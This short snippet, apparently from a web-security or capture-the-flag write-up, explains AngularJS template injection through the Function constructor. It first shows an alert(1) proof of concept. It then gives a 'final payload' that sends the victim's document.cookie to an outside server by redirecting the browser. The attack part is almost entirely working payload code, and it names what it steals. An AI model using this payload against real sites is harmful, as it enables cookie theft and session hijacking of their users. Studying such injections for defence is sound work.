AngularJS allows binding expressions inside double curly braces {{ }}. 
```
{{constructor.constructor("alert(1)")()}}
```

 -   `constructor.constructor` accesses the Function constructor (Function("code")).
 -   It creates a new function: `Function("alert(1)")`, which gets executed.

Final payload:
```
{{constructor.constructor("document.location=`https://my-server.com/?c=`.concat(document.cookie)")()}}
```